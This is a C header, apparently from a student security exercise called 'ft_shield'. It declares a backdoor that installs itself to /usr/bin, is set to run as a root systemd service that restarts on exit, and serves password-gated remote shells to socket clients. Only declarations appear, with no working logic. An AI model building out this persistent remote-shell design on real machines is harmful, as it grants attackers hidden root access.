#ifndef FT_SHIELD_H
# define FT_SHIELD_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

#define BIN_PATH "/usr/bin/ft_shield"
#define PASSHASH "85738f8f9a7f1b04b5329c590ebcb9e425925c6d0984089c43a022de4f19c281" //whatever

# define SYSTEMD_CONFIG "[Unit]\n\
Description=ft_shield\n\
\n\
[Service]\n\
User=root\n\
WorkingDirectory=/\n\
ExecStart=/usr/bin/ft_shield\n\
Restart=always\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n"

typedef struct s_client {
	int					fd;
	bool				logged;
	int					shell_fd;
	pid_t				shell_pid;
	pid_t				output_pid;
} t_client;

typedef struct s_server {
	int									port;
	struct sockaddr_in	addr;
	int									socketfd;
	int									max_fd;
	fd_set							read_fd;
	fd_set							fd_set;
	t_client						clients[3];
	int									nb_clients;
} t_server;

void run_server();
void shell(t_server *server, int fd, char *msg);
char *sha256(char *str, size_t size);
void remove_client(t_server *server, int fd);

#endif